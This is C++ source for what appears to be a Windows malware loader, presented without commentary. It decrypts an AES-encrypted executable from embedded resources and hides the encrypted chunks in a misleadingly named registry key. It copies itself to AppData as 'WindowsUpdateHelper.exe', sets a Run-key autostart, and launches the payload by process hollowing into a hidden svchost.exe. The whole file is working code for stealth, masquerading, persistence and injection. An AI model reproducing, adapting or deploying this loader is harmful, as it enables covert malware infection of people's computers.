#include <windows.h>
#include <cstdint>
#include <vector>
#include <wincrypt.h>
#include <cstdio>
#include <random>  
#include <string>
#include <algorithm>
#include <shlwapi.h>
#include <shlobj.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#define MVAL     0x474E5089


#pragma pack(push, 1)
struct PIndex {
    uint32_t mval = MVAL;
    uint8_t  fkey;
    uint32_t tsize;
    uint16_t ccount;
    uint16_t fchkid;
    uint32_t crc32;
    uint16_t shseed;
};
#pragma pack(pop)
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;

static const char* svchostPath = "C:\\Windows\\System32\\svchost.exe";
static const char* resTypeRCDATA = "RCDATA";
unsigned char* LoadResBID(int id, DWORD* size) {
    HMODULE hMod = GetModuleHandle(NULL);

    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(id), resTypeRCDATA);
    if (!hRes) return nullptr;

    HGLOBAL hGlob = LoadResource(hMod, hRes);
    if (!hGlob) return nullptr;

    *size = SizeofResource(hMod, hRes);
    return (unsigned char*)LockResource(hGlob);
}

uint32_t CalCR32(const char* data, size_t length) {
    uint32_t crc = 0xFFFFFFFF;
    for (size_t i = 0; i < length; i++) {
        crc ^= (uint32_t)(unsigned char)data[i];
        for (int j = 0; j < 8; j++)
            crc = (crc >> 1) ^ (0xEDB88320 & -(crc & 1));
    }
    return ~crc;
}

bool VerPay(const std::vector<char>& pbuf, uint32_t ecrc, uint32_t esize) {
    if (pbuf.size() != esize) {
        return false;
    }
    if (CalCR32(pbuf.data(), pbuf.size()) != ecrc) {
        return false;
    }
    return true;
}

bool IsInAuto() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        DWORD size = sizeof(wchar_t);  // Just check existence
        if (RegQueryValueExW(hKey, L"WindowsUpdateHelper", NULL, NULL, NULL, &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;  // Entry exists → we're persistent
        }
        RegCloseKey(hKey);
    }
    return false;
}
bool AddToAuto() {
    if (IsInAuto()) {
        return true;
    }
   
    wchar_t modulePath[MAX_PATH];
    GetModuleFileNameW(NULL, modulePath, MAX_PATH);
   
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
      
        std::wstring value = L"\"" + std::wstring(modulePath) + L"\"";
        BOOL success = (RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
                          (BYTE*)value.c_str(),
                          (DWORD)(value.length() * sizeof(wchar_t))) == ERROR_SUCCESS);
      
        RegCloseKey(hKey);
        return success;
    }
    return false;
}

bool RegFE() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return false;
    }
   
    std::wstring iName = L"Explorer.exe";
    DWORD size = 0;
    bool indexExists = (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, NULL, &size) == ERROR_SUCCESS);
   
    RegCloseKey(hKey);
    return indexExists;
}

bool StoreFIR(const PIndex& index, const std::vector<std::vector<BYTE>>& eChks) {
    HKEY hKey;
    DWORD disposition;
   
    if (RegCreateKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, NULL, 0, KEY_WRITE, NULL, &hKey, &disposition) != ERROR_SUCCESS) {
        return false;
    }
   
    std::wstring iName = L"Explorer.exe";
    if (RegSetValueExW(hKey, iName.c_str(), 0, REG_BINARY,
                  (BYTE*)&index, sizeof(PIndex)) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
   
    for (size_t i = 0; i < eChks.size(); ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        if (RegSetValueExW(hKey, chunkName.c_str(), 0, REG_BINARY,
                      eChks[i].data(), (DWORD)eChks[i].size()) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return false;
        }
    }
   
    RegCloseKey(hKey);
    return true;
}
std::vector<char> LoadFFR() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER,
        L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\CIDSizeMRU",
        0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return {};
    }
    
    std::wstring iName = L"Explorer.exe";
    DWORD size = sizeof(PIndex);
    PIndex index;
    
    if (RegQueryValueExW(hKey, iName.c_str(), NULL, NULL, (BYTE*)&index, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return {};
    }
    
   if (index.mval != MVAL) {
        RegCloseKey(hKey);
        return {};
    }
    
   
    std::vector<std::vector<BYTE>> shuffledEncryptedChunks(index.ccount);
    for (int i = 0; i < index.ccount; ++i) {
        std::wstring chunkName = L"item" + std::to_wstring(i);
        DWORD chunkSize = 0;
        
        if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) == ERROR_SUCCESS) {
            shuffledEncryptedChunks[i].resize(chunkSize);
            if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, shuffledEncryptedChunks[i].data(), &chunkSize) != ERROR_SUCCESS) {
                RegCloseKey(hKey);
                return {};
            }
        } else {
            RegCloseKey(hKey);
            return {};
        }
    }
    
    RegCloseKey(hKey);
    
    if (shuffledEncryptedChunks.size() != index.ccount) {
        return {};
    }
    
   
    std::vector<int> chunk_order(index.ccount);
    for (int i = 0; i < index.ccount; ++i) {
        chunk_order[i] = i;
    }
    
    std::mt19937 rng(index.shseed);
    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
    
    char shuffle_info[512];
   
    std::vector<std::vector<BYTE>> eChks(index.ccount);
    for (int registry_pos = 0; registry_pos < index.ccount; ++registry_pos) {
        int logical_idx = chunk_order[registry_pos];
        
        if (registry_pos < shuffledEncryptedChunks.size()) {
            eChks[logical_idx] = std::move(shuffledEncryptedChunks[registry_pos]);
            
            char buf[256];
        } else {
            return {};
        }
    }

    char buf[512];
    std::vector<char> pbuf;
    pbuf.reserve(index.tsize + 1024);

    HCRYPTPROV hProv = 0;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return {};
    }

    BYTE aes_key[32] = {0};
    for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
    BYTE last_cipher_block[16] = {0};

    for (int i = 0; i < index.ccount; ++i) {
        if (i >= eChks.size()) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        const auto& encrypted_data = eChks[i];
        DWORD chunk_size = (DWORD)encrypted_data.size();

       
        BYTE iv[16] = {0};
        if (i > 0) {
            memcpy(iv, last_cipher_block, 16);
        }

        struct {
            BLOBHEADER hdr;
            DWORD      dwKeySize;
            BYTE       key[32];
        } keyblob = {0};

        keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
        keyblob.hdr.bVersion = CUR_BLOB_VERSION;
        keyblob.hdr.reserved = 0;
        keyblob.hdr.aiKeyAlg = CALG_AES_256;
        keyblob.dwKeySize    = 32;
        memcpy(keyblob.key, aes_key, 32);

        HCRYPTKEY hKey = 0;
        if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
            CryptReleaseContext(hProv, 0);
            return {};
        }

        if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

       
        std::vector<BYTE> decbuf(chunk_size);
        memcpy(decbuf.data(), encrypted_data.data(), chunk_size);
        DWORD out_len = chunk_size;

        if (!CryptDecrypt(hKey, 0, FALSE, 0, decbuf.data(), &out_len)) {
            CryptDestroyKey(hKey);
            CryptReleaseContext(hProv, 0);
            return {};
        }

        CryptDestroyKey(hKey);

        if (chunk_size >= 16) {
            memcpy(last_cipher_block, encrypted_data.data() + chunk_size - 16, 16);
        } else {
            memcpy(last_cipher_block, encrypted_data.data(), chunk_size);
            memset(last_cipher_block + chunk_size, 0, 16 - chunk_size);
        }

        if (out_len > 0) {
            BYTE pad = decbuf[out_len - 1];
            if (pad >= 1 && pad <= 16) {
                bool valid = true;
                for (int j = 0; j < pad; ++j) {
                    if (decbuf[out_len - 1 - j] != pad) {
                        valid = false;
                        break;
                    }
                }
                if (valid) {
                    out_len -= pad;
                }
            }
        }

        pbuf.insert(pbuf.end(), (char*)decbuf.data(), (char*)decbuf.data() + out_len);
        
    }

    CryptReleaseContext(hProv, 0);

    if (!VerPay(pbuf, index.crc32, index.tsize)) {
        return {};
    }
    return pbuf;
}


std::pair<PIndex, std::vector<std::vector<BYTE>>> LoadEFR() {
    DWORD iSize = 0;
    unsigned char* idata = LoadResBID(999, &iSize);
    if (!idata || iSize < sizeof(PIndex)) {
        return {};
    }

    PIndex* idx = (PIndex*)idata;
    if (idx->mval != MVAL) {
        return {};
    }

    std::vector<std::vector<BYTE>> shEChks;
    for (int respos = 0; respos < idx->ccount; ++respos) {
        int resId = idx->fchkid + respos;
        
        DWORD chksize = 0;
        unsigned char* encbuf = LoadResBID(resId, &chksize);
        
        if (encbuf && chksize > 0) {
            std::vector<BYTE> chunk(encbuf, encbuf + chksize);
            shEChks.push_back(chunk);
            
            char buf[256];
       
        } else {
            char buf[256];

            return {};
        }
    }

    if (shEChks.size() != idx->ccount) {
        return {};
    }
    
    std::vector<int> chkOrdr(idx->ccount);
    for (int i = 0; i < idx->ccount; ++i) {
        chkOrdr[i] = i;
    }
    
    std::mt19937 rng(idx->shseed);
    std::shuffle(chkOrdr.begin(), chkOrdr.end(), rng);
    
  
    char shuffle_info[512];

    
    std::vector<std::vector<BYTE>> eChks(idx->ccount);

for (int r_pos = 0; r_pos < idx->ccount; ++r_pos) {
    int log_idx = chkOrdr[r_pos];

    if (r_pos < shEChks.size()) {
       eChks[log_idx] = std::move(shEChks[r_pos]);

        char buf[256];
    } else {  
        return {};
    }
}

    
    return {*idx, eChks};
}

bool CopySTPL() {
    wchar_t currentPath[MAX_PATH];
    if (GetModuleFileNameW(NULL, currentPath, MAX_PATH) == 0) {
        return false;
    }

    wchar_t appDataPath[MAX_PATH];
    if (FAILED(SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {
        return false;
    }

    wchar_t targetPath[MAX_PATH];
    PathCombineW(targetPath, appDataPath, L"Microsoft\\Windows\\WindowsUpdateHelper.exe");

    // Check if the target file ALREADY EXISTS
    if (PathFileExistsW(targetPath)) {
        // Already present → assume registry is correct too (or check separately)
        return true;  // Success: no need to copy
    }

    // Target doesn't exist → proceed with copy
    wchar_t dirPath[MAX_PATH];
    wcscpy_s(dirPath, targetPath);
    PathRemoveFileSpecW(dirPath);
    SHCreateDirectoryExW(NULL, dirPath, NULL);

    if (CopyFileW(currentPath, targetPath, FALSE)) {  // FALSE = overwrite if exists (but we already checked)
        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CURRENT_USER,
            L"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            
            std::wstring value = L"\"" + std::wstring(targetPath) + L"\"";
            RegSetValueExW(hKey, L"WindowsUpdateHelper", 0, REG_SZ,
                           (BYTE*)value.c_str(),
                           (DWORD)(value.length() * sizeof(wchar_t)));
            RegCloseKey(hKey);
        }
        return true;
    }

    return false;
}
std::vector<char> RecFWRP() {
    CopySTPL();
    if (!IsInAuto()) {
        AddToAuto();
    }
    
    if (RegFE()) {
      
        auto rPBuf = LoadFFR();
        if (!rPBuf.empty()) {
          
            return rPBuf;
        }
     
    }
    
   
    auto [index, enChksLog] = LoadEFR();   
    if (!enChksLog.empty()) {
        std::vector<int>chkOrdr(index.ccount);
        for (int i = 0; i < index.ccount; ++i) {
           chkOrdr[i] = i;
        }
        
        std::mt19937 rng(index.shseed);
        std::shuffle(chkOrdr.begin(),chkOrdr.end(), rng);
        std::vector<int> inv_ord(index.ccount);
        for (int regpos = 0; regpos < index.ccount; ++regpos) {
            int log_idx = chkOrdr[regpos];
            inv_ord[log_idx] = regpos;
        }
        
        std::vector<std::vector<BYTE>> encChksShuf(index.ccount);
        for (int log_idx = 0; log_idx < index.ccount; ++log_idx) {
            int reg_pos =  inv_ord[log_idx];
            encChksShuf[reg_pos] = enChksLog[log_idx];
            char buf[256];
        }
        
        StoreFIR(index, encChksShuf);
       
        char buf[512];
        std::vector<char> pbuf;
        pbuf.reserve(index.tsize + 1024);

        HCRYPTPROV hProv = 0;
        if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
          
            return {};
        }

        BYTE aes_key[32] = {0};
        for (int i = 0; i < 32; i++) aes_key[i] = index.fkey ^ (i * 0x11);
        BYTE last_cipher_block[16] = {0};

        for (int i = 0; i < index.ccount; ++i) {
            const auto& enc_buf = enChksLog[i];
            DWORD chk_s = (DWORD)enc_buf.size();
           
            BYTE iv[16] = {0};
            if (i > 0) {
                memcpy(iv, last_cipher_block, 16);
            }

            struct {
                BLOBHEADER hdr;
                DWORD      dwKeySize;
                BYTE       key[32];
            } keyblob = {0};

            keyblob.hdr.bType    = PLAINTEXTKEYBLOB;
            keyblob.hdr.bVersion = CUR_BLOB_VERSION;
            keyblob.hdr.reserved = 0;
            keyblob.hdr.aiKeyAlg = CALG_AES_256;
            keyblob.dwKeySize    = 32;
            memcpy(keyblob.key, aes_key, 32);

            HCRYPTKEY hKey = 0;
            if (!CryptImportKey(hProv, (BYTE*)&keyblob, sizeof(keyblob), 0, 0, &hKey)) {
                CryptReleaseContext(hProv, 0);
                return {};
            }

            if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            std::vector<BYTE> dec(chk_s);
            memcpy(dec.data(), enc_buf.data(), chk_s);
            DWORD out_len = chk_s;

            if (!CryptDecrypt(hKey, 0, FALSE, 0, dec.data(), &out_len)) {
                CryptDestroyKey(hKey);
                CryptReleaseContext(hProv, 0);
                return {};
            }

            CryptDestroyKey(hKey);

            if (chk_s >= 16) {
                memcpy(last_cipher_block, enc_buf.data() + chk_s - 16, 16);
            }

            if (out_len > 0) {
                BYTE pad = dec[out_len - 1];
                if (pad >= 1 && pad <= 16) {
                    bool valid = true;
                    for (int j = 0; j < pad; ++j) {
                        if (dec[out_len - 1 - j] != pad) {
                            valid = false;
                            break;
                        }
                    }
                    if (valid) {
                        out_len -= pad;
                    }
                }
            }

            pbuf.insert(pbuf.end(), (char*)dec.data(), (char*)dec.data() + out_len);
        }

        CryptReleaseContext(hProv, 0);

        if (VerPay(pbuf, index.crc32, index.tsize)) {
            return pbuf;
        }
    }
    
    return {};
}

bool Start(char* payload, uint32_t payloadSize) {
    BYTE* pe = (BYTE*)payload;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;

    if (dos->e_lfanew < sizeof(IMAGE_DOS_HEADER) || dos->e_lfanew > payloadSize - sizeof(IMAGE_NT_HEADERS64)) {
        return false;
    }

    IMAGE_NT_HEADERS64* nt = (IMAGE_NT_HEADERS64*)(pe + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sections = IMAGE_FIRST_SECTION(nt);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return false;
    }

    PROCESS_INFORMATION pi;
    STARTUPINFOA si = { sizeof(si) };
    // Now using the plain hardcoded path
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, (LPSTR)svchostPath, NULL, NULL, FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi)) {
        return false;
    }

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL | CONTEXT_INTEGER | CONTEXT_CONTROL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    ULONGLONG originalImageBase = nt->OptionalHeader.ImageBase;

    LPVOID remoteImage = VirtualAllocEx(
        pi.hProcess,
        (LPVOID)originalImageBase,
        nt->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!remoteImage) {
        remoteImage = VirtualAllocEx(pi.hProcess, NULL,
            nt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);
        if (!remoteImage) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    ULONGLONG delta = (ULONGLONG)remoteImage - originalImageBase;

    if (delta != 0 && nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size) {
        IMAGE_DATA_DIRECTORY relocDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        IMAGE_BASE_RELOCATION* reloc = (IMAGE_BASE_RELOCATION*)(pe + relocDir.VirtualAddress);
        SIZE_T processed = 0;
        while (processed < relocDir.Size) {
            DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* relocData = (WORD*)(reloc + 1);
            for (DWORD i = 0; i < count; ++i) {
                DWORD type = relocData[i] >> 12;
                DWORD offset = relocData[i] & 0xFFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONGLONG* patchAddr = (ULONGLONG*)(pe + reloc->VirtualAddress + offset);
                    *patchAddr += delta;
                }
            }
            processed += reloc->SizeOfBlock;
            reloc = (IMAGE_BASE_RELOCATION*)((BYTE*)reloc + reloc->SizeOfBlock);
        }
    }

    nt->OptionalHeader.ImageBase = (ULONGLONG)remoteImage;

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteImage, pe, nt->OptionalHeader.SizeOfHeaders, &written)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        LPVOID dest = (BYTE*)remoteImage + sections[i].VirtualAddress;
        LPVOID src = pe + sections[i].PointerToRawData;
        SIZE_T sectionSize = std::max(sections[i].SizeOfRawData, sections[i].Misc.VirtualSize);

        if ((BYTE*)src + sections[i].SizeOfRawData > (BYTE*)payload + payloadSize) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }

        BYTE* padded = new BYTE[sectionSize];
        ZeroMemory(padded, sectionSize);
        memcpy(padded, src, sections[i].SizeOfRawData);

        if (!WriteProcessMemory(pi.hProcess, dest, padded, sectionSize, &written)) {
            delete[] padded;
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
        delete[] padded;
    }

    using pNtQuery = NTSTATUS(NTAPI*)(HANDLE, int, PVOID, ULONG, PULONG);
    static pNtQuery pNt = nullptr;
    if (!pNt) {
        pNt = (pNtQuery)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
        if (!pNt) {
            TerminateProcess(pi.hProcess, 0);
            return false;
        }
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG returnLength = 0;
    if (pNt(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) != 0) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    PVOID pebBase = (BYTE*)pbi.PebBaseAddress + 0x10;
    WriteProcessMemory(pi.hProcess, pebBase, &nt->OptionalHeader.ImageBase, sizeof(ULONGLONG), NULL);

    ctx.Rip = (ULONGLONG)remoteImage + nt->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    FlushInstructionCache(pi.hProcess, remoteImage, nt->OptionalHeader.SizeOfImage);
    Sleep(100);

    HWND hWnd = GetTopWindow(NULL);
    while (hWnd) {
        DWORD pid;
        GetWindowThreadProcessId(hWnd, &pid);
        if (pid == pi.dwProcessId) {
            ShowWindow(hWnd, SW_HIDE);
            ShowWindow(hWnd, SW_MINIMIZE);
            break;
        }
        hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
    }

    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return true;
}
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    auto pbuf = RecFWRP();
    if (pbuf.empty()) {
        return -1;
    }
  
    if (!Start(pbuf.data(), (uint32_t)pbuf.size())) {
        return -1;
    }
    return 0;
}